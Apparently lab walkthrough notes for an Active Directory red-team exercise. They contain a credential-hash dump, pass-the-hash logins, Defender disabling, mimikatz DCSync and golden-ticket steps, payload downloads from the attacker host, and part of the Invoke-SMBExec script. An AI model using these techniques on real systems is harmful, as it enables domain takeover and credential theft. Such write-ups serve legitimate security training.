marion.storey:1485:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
elaine.rogers:1486:aad3b435b51404eeaad3b435b51404ee:6c1a75b5d917d9ee0a97992cd98562e4:::
olivia.ahmed:1487:aad3b435b51404eeaad3b435b51404ee:3ebd6ff371829e60c57d15b0fe71194e:::
james.gough:1488:aad3b435b51404eeaad3b435b51404ee:46b5dcb94ea7216ba4fe57e1e9f10036:::
anna.jenkins:1489:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
eric.cross:1490:aad3b435b51404eeaad3b435b51404ee:1b718381d29f9ef5485922afa6c71497:::
carly.parker:1491:aad3b435b51404eeaad3b435b51404ee:28c68ff59b7b704136511140c59a579a:::
abigail.davies:1492:aad3b435b51404eeaad3b435b51404ee:b85c9606d42a00df0135f6112267bb09:::
jenna.moss:1493:aad3b435b51404eeaad3b435b51404ee:ccb8510ae5a799e7573d8c9a13b5bd19:::
elaine.lawrence:1494:aad3b435b51404eeaad3b435b51404ee:26b2320f77a18b5e679717a0c847cb83:::
holly.murray:1495:aad3b435b51404eeaad3b435b51404ee:a05e41e27ce0ef0fbaa6cb423fbd6aad:::
leanne.whitehead:1496:aad3b435b51404eeaad3b435b51404ee:145f0a03039522410e8e7fd59495a996:::
gregory.wright:1497:aad3b435b51404eeaad3b435b51404ee:b7aa5181c0839392dbe7b6eaa2e4b86b:::
philip.jones:1498:aad3b435b51404eeaad3b435b51404ee:cc492c5ee88d6b7c225ae28268eeb08a:::
arthur.allen:1499:aad3b435b51404eeaad3b435b51404ee:f5a68301eb21fbd3506f7e2376411529:::
ashleigh.graham:1500:aad3b435b51404eeaad3b435b51404ee:83a6cccc5544ebdff814b1159a5088ad:::
christopher.white:1501:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
joseph.lee:1502:aad3b435b51404eeaad3b435b51404ee:5565573cdbf252852fd89105d860b5ef:::
t2_joseph.lee:1503:aad3b435b51404eeaad3b435b51404ee:c5d85fff1f00152d1d92ec8cc1524b0f:::
mark.jackson:1504:aad3b435b51404eeaad3b435b51404ee:65621efefc4b8f8c7c343a1b8a562034:::
john.gardiner:1505:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
jake.taylor:1506:aad3b435b51404eeaad3b435b51404ee:c0736ad68afc4147b441fbec6b051932:::
richard.stewart:1507:aad3b435b51404eeaad3b435b51404ee:8a56eeddcfbd19ae701b646881893b2b:::
sharon.hughes:1508:aad3b435b51404eeaad3b435b51404ee:cc9b63b9cccf56c318e7e8c2234bd68f:::
rita.bradshaw:1509:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
chelsea.archer:1510:aad3b435b51404eeaad3b435b51404ee:9bc1d0a424a1ec9ddf988cee6b486358:::
cameron.bell:1511:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
malcolm.johnson:1512:aad3b435b51404eeaad3b435b51404ee:11998fa16006e4fc5da7317eb42a4e8f:::
edward.banks:1513:aad3b435b51404eeaad3b435b51404ee:e9c538d631c3bc457f68026b12f70684:::
t2_edward.banks:1514:aad3b435b51404eeaad3b435b51404ee:fe4bba3b17ad1857bc95b483714736bb:::
melissa.walton:1515:aad3b435b51404eeaad3b435b51404ee:c8a4ff335e6a2650ebd7ed715af19b25:::
karen.price:1516:aad3b435b51404eeaad3b435b51404ee:240cb245c80af870542a98d6a7879ab3:::
victor.james:1517:aad3b435b51404eeaad3b435b51404ee:2e238f325de313b88d1e401dcd23c8f8:::
frederick.daniels:1518:aad3b435b51404eeaad3b435b51404ee:df433c41324508907ff701ffb460b1aa:::
dennis.holland:1519:aad3b435b51404eeaad3b435b51404ee:9bca29e918ea15f7abe93cef37146e6a:::
gary.harper:1520:aad3b435b51404eeaad3b435b51404ee:0ac7e6e20192ef3e36e5090c165887ea:::
francesca.young:1521:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
james.smith:1522:aad3b435b51404eeaad3b435b51404ee:5558479e3ba00e85fc023a841fba1c9a:::
mathew.allan:1523:aad3b435b51404eeaad3b435b51404ee:4d269ec87e3c0da5fd450c16d7bebbff:::
jacob.morgan:1524:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
raymond.taylor:1525:aad3b435b51404eeaad3b435b51404ee:15cadef1a30dae5d263baa5dda9c4a70:::
julie.bennett:1526:aad3b435b51404eeaad3b435b51404ee:aaacd12a9a9a385e2cab7a0edd0e5b13:::
kayleigh.davies:1527:aad3b435b51404eeaad3b435b51404ee:f57a4a8c58aaf77ca8d5a688ff9b4ebd:::
kerry.webster:1528:aad3b435b51404eeaad3b435b51404ee:24a6d7dc41a3da0bf53fe669d06888f3:::
t2_kerry.webster:1529:aad3b435b51404eeaad3b435b51404ee:106926a193a79d7714d575597be70a2a:::
matthew.adams:1530:aad3b435b51404eeaad3b435b51404ee:46e195f4f24aca015d2b9f3106265f1c:::
lucy.coleman:1531:aad3b435b51404eeaad3b435b51404ee:a1e9ab5f7b38f0a8420392b58f622e58:::
catherine.gray:1532:aad3b435b51404eeaad3b435b51404ee:cc82f4d89bb0c1b5f74c62df2e36e92f:::
robin.lord:1533:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
tom.davidson:1534:aad3b435b51404eeaad3b435b51404ee:d2d419d2b3d4ce18a6fd1d9abd37b0a0:::
beverley.dixon:1535:aad3b435b51404eeaad3b435b51404ee:88b32494530769216744f7fb0f1544e4:::
donna.williamson:1536:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
charlotte.white:1537:aad3b435b51404eeaad3b435b51404ee:98f97e02c2083d828f3adf421f43b7e7:::
marie.thomas:1538:aad3b435b51404eeaad3b435b51404ee:eec2406d0e39fdf1b973d5637e65631a:::
dale.mitchell:1539:aad3b435b51404eeaad3b435b51404ee:3d6fd3a701cb132b87b1a5fecf521f6c:::
peter.jackson:1540:aad3b435b51404eeaad3b435b51404ee:952eda9ddcffa69e70aa5187acd5e54a:::
ricky.clayton:1541:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
dominic.barnett:1542:aad3b435b51404eeaad3b435b51404ee:20005b8add548e59de95efd7ff6f4bd1:::
lynne.hill:1543:aad3b435b51404eeaad3b435b51404ee:8091fee1f3890584904bd7d5cea1240e:::
andrew.atkins:1544:aad3b435b51404eeaad3b435b51404ee:9cbd8b6ef2221a9358232b6105a4d306:::
charlotte.mellor:1545:aad3b435b51404eeaad3b435b51404ee:7ee747dc6bb07338ffcde917040bb9b7:::
charlene.taylor:1546:aad3b435b51404eeaad3b435b51404ee:adcfdb5c06c564653145d8a75035b079:::
t2_charlene.taylor:1547:aad3b435b51404eeaad3b435b51404ee:b162c2b867f397509e19adc941f84e49:::
hazel.rose:1548:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
lewis.higgins:1549:aad3b435b51404eeaad3b435b51404ee:a89d185f48de77ed3ed2719960d610d9:::
steven.hewitt:1550:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
t1_steven.hewitt:1551:aad3b435b51404eeaad3b435b51404ee:529dc07cdcb94554ce2213a96da3296d:::
reece.hancock:1552:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
dominic.hall:1553:aad3b435b51404eeaad3b435b51404ee:ec1d791dd2df5c0fe54033a23984ece6:::
jake.cooke:1554:aad3b435b51404eeaad3b435b51404ee:0345bb5146450849fd1b16281fc37623:::
garry.ford:1555:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
natasha.cunningham:1556:aad3b435b51404eeaad3b435b51404ee:5703afdfb1f95d88ecf94c0d9a221641:::
judith.davies:1557:aad3b435b51404eeaad3b435b51404ee:83cfa039c559808b89f3c57bd303fdc2:::
kimberley.davies:1558:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
jade.faulkner:1559:aad3b435b51404eeaad3b435b51404ee:66b493d65a854107593794bbf6270fc3:::
leanne.green:1560:aad3b435b51404eeaad3b435b51404ee:a373511d7171ed566de444d9c59e1bfe:::
alexander.kaur:1561:aad3b435b51404eeaad3b435b51404ee:dacd57f9f05f852c35ca3658366684e6:::
philip.sullivan:1562:aad3b435b51404eeaad3b435b51404ee:3752129d3885487cb8ab2348e62e1f1a:::
jason.walker:1563:aad3b435b51404eeaad3b435b51404ee:17fbdd6e7a3334156b305584e8a9b1ae:::
louise.henderson:1564:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
marc.phillips:1565:aad3b435b51404eeaad3b435b51404ee:c084c6bbdb843509f2d08fcdee24621a:::
edward.cole:1566:aad3b435b51404eeaad3b435b51404ee:0f63593b2373d644a38138b8aab4b0e2:::
gregory.hunt:1567:aad3b435b51404eeaad3b435b51404ee:1b3772dc75665eac35f95f5464ab7e5a:::
harriet.barber:1568:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
geraldine.mccarthy:1569:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
linda.lawrence:1570:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
aimee.patel:1571:aad3b435b51404eeaad3b435b51404ee:e6e409cce6543450813325788178007e:::
martin.hilton:1572:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
claire.connolly:1573:aad3b435b51404eeaad3b435b51404ee:d20789005bf605a095e8bf46536c2e27:::
michael.kelly:1574:aad3b435b51404eeaad3b435b51404ee:6c5cf4ae468175f1c31a58c5759e690c:::
t2_michael.kelly:1575:aad3b435b51404eeaad3b435b51404ee:b980f14bd5fd70233473da74d274ebad:::
mohammad.webster:1576:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
craig.ellis:1577:aad3b435b51404eeaad3b435b51404ee:cc1c36a0d9e56ee5639574859910d704:::
melanie.owens:1578:aad3b435b51404eeaad3b435b51404ee:3a4970729caaca4312ac448a42233362:::
kyle.fletcher:1579:aad3b435b51404eeaad3b435b51404ee:da4a96b1728442a1de8915aa2f6ff286:::
lawrence.lewis:1580:aad3b435b51404eeaad3b435b51404ee:70b8990d1203f2be850bd1c0ee026024:::
emma.james:1581:aad3b435b51404eeaad3b435b51404ee:b5045bddeeaca8f9a7f101975a31a2f8:::
t2_emma.james:1582:aad3b435b51404eeaad3b435b51404ee:23c502cc6076d310c3731e44be1d1edc:::
mathew.edwards:1583:aad3b435b51404eeaad3b435b51404ee:596acae9cf18f9e6f255d5a9214f0dd4:::
annette.lloyd:1584:aad3b435b51404eeaad3b435b51404ee:50774105468bfd8a65e22cb201174219:::
t2_annette.lloyd:1585:aad3b435b51404eeaad3b435b51404ee:aea50a0d7bcaba7ce511c9ba73f7787e:::
t1_annette.lloyd:1586:aad3b435b51404eeaad3b435b51404ee:c588c959271cd017884b46f2521d025b:::
graeme.turner:1587:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
holly.robinson:1588:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
megan.brooks:1589:aad3b435b51404eeaad3b435b51404ee:dd1a65abdafe2bca37fcf284e376d38f:::
joe.ellis:1590:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
lydia.ford:1591:aad3b435b51404eeaad3b435b51404ee:4b8a69bbd5012ed099211ce0ae4d7f40:::
alexander.bentley:1592:aad3b435b51404eeaad3b435b51404ee:14cbc29bc09b1bd29dbdfbcc1f365828:::
t2_alexander.bentley:1593:aad3b435b51404eeaad3b435b51404ee:717ce581c64e3859cb02690cd7b16617:::
kieran.marshall:1594:aad3b435b51404eeaad3b435b51404ee:b0d7a62673b80ff6bc7547a64f77e5d2:::
tracey.collier:1595:aad3b435b51404eeaad3b435b51404ee:a2b5a4cf8e92f507ccf175b59905d75b:::
eric.hunt:1596:aad3b435b51404eeaad3b435b51404ee:82473e53b644cc962c31c418b1e2b8a3:::
maureen.arnold:1597:aad3b435b51404eeaad3b435b51404ee:bdd5c0310ca602901cbfb3173c64428c:::
reece.field:1598:aad3b435b51404eeaad3b435b51404ee:6815674cdba0d002b818c05796e25987:::
teresa.williams:1599:aad3b435b51404eeaad3b435b51404ee:b4687002c7ae6f43c975847f9939ec07:::
terry.lewis:1600:aad3b435b51404eeaad3b435b51404ee:6186cce5a26e8da95c2d3f2e67cbe34a:::
t2_terry.lewis:1601:aad3b435b51404eeaad3b435b51404ee:eb7d2db68be67d4db924236b0f86c5a4:::
kirsty.turner:1602:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
yvonne.carroll:1603:aad3b435b51404eeaad3b435b51404ee:deead630a3be1bef3f5c9491a86bbb56:::
katy.barber:1604:aad3b435b51404eeaad3b435b51404ee:f9ca9e4c4cf0d422e1c8e5ccc9bec58a:::
kayleigh.shaw:1605:aad3b435b51404eeaad3b435b51404ee:c5430c12553313218d81e4204e8adaca:::
t1_kayleigh.shaw:1606:aad3b435b51404eeaad3b435b51404ee:a3353ba7080acb492d61bb8688a3f787:::
leanne.howarth:1607:aad3b435b51404eeaad3b435b51404ee:19bdf055b26734968b83e1dca7cf50fa:::
jacqueline.khan:1608:aad3b435b51404eeaad3b435b51404ee:8091fee1f3890584904bd7d5cea1240e:::
toby.nicholson:1609:aad3b435b51404eeaad3b435b51404ee:d05702eeb3a23c975d93e7c4df624689:::
grace.webb:1610:aad3b435b51404eeaad3b435b51404ee:b6ec23074ca80e87ed796ca8a39fc9ab:::
william.brown:1611:aad3b435b51404eeaad3b435b51404ee:18a3c59be53582ae234083d8ffec1664:::
t2_william.brown:1612:aad3b435b51404eeaad3b435b51404ee:5b2659923e53e3bab53a9980963a45de:::
albert.jones:1613:aad3b435b51404eeaad3b435b51404ee:cca2d9cfb5629a94f189961171e59c1c:::
bruce.day:1614:aad3b435b51404eeaad3b435b51404ee:02b97a91e3c268cc0e0d66a53165177d:::
geraldine.nicholls:1615:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
marie.anderson:1616:aad3b435b51404eeaad3b435b51404ee:f8ae8d205ee068417c73152d214270f4:::
michelle.cartwright:1617:aad3b435b51404eeaad3b435b51404ee:92738f96976abb858429566fbb7c97c7:::
marian.russell:1618:aad3b435b51404eeaad3b435b51404ee:238f610c73e3d446e2fd413677a67697:::
sian.pritchard:1619:aad3b435b51404eeaad3b435b51404ee:db2dc5ebca4669c5c5ebbbea9c24411d:::
kim.morton:1620:aad3b435b51404eeaad3b435b51404ee:f33de88855a18fc3bb70157ffc7a840f:::
t1_kim.morton:1621:aad3b435b51404eeaad3b435b51404ee:ab058d8cca0c62945c1081d6911d4df6:::
marc.smith1:1622:aad3b435b51404eeaad3b435b51404ee:fab1f3fef8c2e43a3017ae1573963285:::
stewart.green:1623:aad3b435b51404eeaad3b435b51404ee:f24b6cef456ec956785d89c342d0911c:::
andrew.edwards:1624:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
mathew.mclean:1625:aad3b435b51404eeaad3b435b51404ee:065d046b38f18bee153cb7b40e02fcf9:::
olivia.alexander:1626:aad3b435b51404eeaad3b435b51404ee:3901a7869151457db6a4ad01dabb1b8b:::
gerard.hughes:1627:aad3b435b51404eeaad3b435b51404ee:83a4dddfa0f80c8fba3055e3d9d1be47:::
zoe.berry:1628:aad3b435b51404eeaad3b435b51404ee:cdfa1f04270cbc61a4f166c01c44b35f:::
leonard.miller:1629:aad3b435b51404eeaad3b435b51404ee:931aeb76da44d1a50db0b5f1ebca3cc8:::
brett.murray:1630:aad3b435b51404eeaad3b435b51404ee:316c5ae8a7b5dfce4a5604d17d9e976e:::
rosemary.ellis:1631:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
sophie.hilton:1632:aad3b435b51404eeaad3b435b51404ee:df9401a9544d7abf86db19b3fd2492d2:::
henry.khan:1633:aad3b435b51404eeaad3b435b51404ee:4857f966b3e273dc5ea08200d2811a32:::
lydia.harrison:1634:aad3b435b51404eeaad3b435b51404ee:267ad40660609a0f5af43e89f21ce622:::
alexander.warren:1635:aad3b435b51404eeaad3b435b51404ee:8aad38a40863fe20c1869f618046bfb4:::
danny.ward:1636:aad3b435b51404eeaad3b435b51404ee:4f8ee616219d34b57c81f13eaab51da0:::
leah.quinn:1637:aad3b435b51404eeaad3b435b51404ee:6a5e65d6fa12c32440c43cb988798673:::
```

## 10.200.89.32

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.32
```

<figure><img src="../../.gitbook/assets/image (51) (2).png" alt=""><figcaption></figcaption></figure>

## 10.200.89.51

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.51
```

All ports filtered or issue with server.

## 10.200.89.52

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.52
```

All ports filtered or issue with server.

## 10.200.89.61

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.61
```

All ports filtered or issue with server.&#x20;

## 10.200.89.100

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.100
```

## 10.200.89.102

scanned from VPN server after rooting

```
nmap -sV -sT -O -p 1-65535 10.200.89.102
```

We are able to login because we had the hash already. This is a powershell cmd

**Kali**

```
proxychains evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.89.102
```

This is just cmd

**Kali**

```
proxychains /usr/local/bin/psexec.py Administrator@10.200.89.102 -hashes d3d4edcc015856e386074795aea86b3e:d3d4edcc015856e386074795aea86b3e
```

**Kali**

```
net user zepic pass123! /ADD /DOMAIN
net localgroup Administrators zepic /add
net group "Domain Admins" zepic /ADD /DOMAIN
```

## Download Mimikatz

**Kali**

```
cp /opt/Mimikatz/x64/mimikatz.exe .
python2 -m SimpleHTTPServer 81
```

**Victim(VPN)**

```
wget http://$KALI:81/mimikatz.exe
sudo python2 -m SimpleHTTPServer 81
```

Turn off Windows Defender to download mimikatz

**Victim(CORPDC)**

```
Set-MpPreference -DisableRealtimeMonitoring $true
wget http://10.200.89.12:81/mimikatz.exe -O mimikatz.exe
.\mimikatz
```

**Victim(mimikatz)**

```
privilege::debug
lsadump::dcsync /user:corp\krbtgt
```

**Output**

<pre><code><strong>Credentials:
</strong>  Hash NTLM: 0c757a3445acb94a654554f3ac529ede
    ntlm- 0: 0c757a3445acb94a654554f3ac529ede
    lm  - 0: d99b85523676a2f2ec54ec88c75e62e7
</code></pre>

Get SID of the domain

**Victim(Powershell)**

```
Get-ADComputer -Identity "CORPDC"
```

<figure><img src="../../.gitbook/assets/image (4) (1) (9).png" alt=""><figcaption></figcaption></figure>

Get SID of the Administrator account

**Victim(Powershell)**

```
Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
```

<figure><img src="../../.gitbook/assets/image (84) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mimikatz)**

```
kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
```

We now have access to the rootdc

**Victim(Powershell)**

```
dir \\rootdc.thereserve.loc\c$
```

<figure><img src="../../.gitbook/assets/image (83) (3).png" alt=""><figcaption></figcaption></figure>

### Download Psexec

Link: [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

**Kali**

```
unzip PSTools.zip
python2 -m SimpleHTTPServer 81
```

**Victim(VPN)**

```
wget http://$KALI:81/PsExec64.exe
sudo python2 -m SimpleHTTPServer 81
```

Turn off Windows Defender to download mimikatz

**Victim(CORPDC)**

```
Set-MpPreference -DisableRealtimeMonitoring $true
wget http://10.200.89.12:81/PsExec64.exe -O PsExec64.exe
.\PsExec64.exe \\rootdc.thereserve.loc cmd.exe
```

<figure><img src="../../.gitbook/assets/image (81) (2).png" alt=""><figcaption></figcaption></figure>

**RootDC**

```
net user Administrator pass123!
```

**Invoke-SMBExec Script**

```
function Invoke-SMBExec

{

<#

.SYNOPSIS

Invoke-SMBExec performs SMBExec style command execution with NTLMv2 pass the hash authentication. Invoke-SMBExec

supports SMB1 and SMB2 with and without SMB signing.



.PARAMETER Target

Hostname or IP address of target.



.PARAMETER Username

Username to use for authentication.



.PARAMETER Domain

Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the

username. 



.PARAMETER Hash

NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.



.PARAMETER Command

Command to execute on the target. If a command is not specified, the function will check to see if the username

and hash provides local administrator access on the target.



.PARAMETER CommandCOMSPEC

Default = Enabled: Prepend %COMSPEC% /C to Command.



.PARAMETER Service

Default = 20 Character Random: Name of the service to create and delete on the target.



.PARAMETER SMB1

(Switch) Force SMB1. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the

target.



.PARAMETER Sleep

Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this

setting if you are experiencing strange results.



.EXAMPLE

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose



.EXAMPLE

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "net user SMBExec Winter2017 /add"



.EXAMPLE

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0



.LINK

https://github.com/Kevin-Robertson/Invoke-TheHash



#>

[CmdletBinding()]

param

(

    [parameter(Mandatory=$true)][String]$Target,

    [parameter(Mandatory=$true)][String]$Username,

    [parameter(Mandatory=$false)][String]$Domain,

    [parameter(Mandatory=$false)][String]$Command,

    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",

    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,

    [parameter(Mandatory=$false)][String]$Service,

    [parameter(Mandatory=$false)][Switch]$SMB1,

    [parameter(Mandatory=$false)][Int]$Sleep=150

)



if($Command)

{

    $SMB_execute = $true

}



if($SMB1)

{

    $SMB_version = 'SMB1'

}



function ConvertFrom-PacketOrderedDictionary

{

    param($packet_ordered_dictionary)



    ForEach($field in $packet_ordered_dictionary.Values)

    {

        $byte_array += $field

    }



    return $byte_array

}



#NetBIOS



function Get-PacketNetBIOSSessionService()

{

    param([Int]$packet_header_length,[Int]$packet_data_length)



    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)

    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]



    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))

    $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))



    return $packet_NetBIOSSessionService

}



#SMB1



function Get-PacketSMBHeader()

{

    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)



    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))

    $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)

    $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))

    $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))

    $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))

    $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)

    $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)

    $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))

    $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))

    $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)

    $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)

    $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)

    $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))



    return $packet_SMBHeader

}



function Get-PacketSMBNegotiateProtocolRequest()

{

    param([String]$packet_version)



    if($packet_version -eq 'SMB1')

    {

        [Byte[]]$packet_byte_count = 0x0c,0x00

    }

    else

    {

        [Byte[]]$packet_byte_count = 0x22,0x00  

    }



    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))

    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)

    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))

    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))



    if($packet_version -ne 'SMB1')

    {

        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))

        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))

        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))

        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))

    }



    return $packet_SMBNegotiateProtocolRequest

}



function Get-PacketSMBSessionSetupAndXRequest()

{

    param([Byte[]]$packet_security_blob)



    [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)

    $packet_byte_count = $packet_byte_count[0,1]

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)

    $packet_security_blob_length = $packet_security_blob_length[0,1]



    $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))

    $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))



    return $packet_SMBSessionSetupAndXRequest 

}



function Get-PacketSMBTreeConnectAndXRequest()

{

    param([Byte[]]$packet_path)



    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)

    $packet_path_length = $packet_path_length[0,1]



    $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

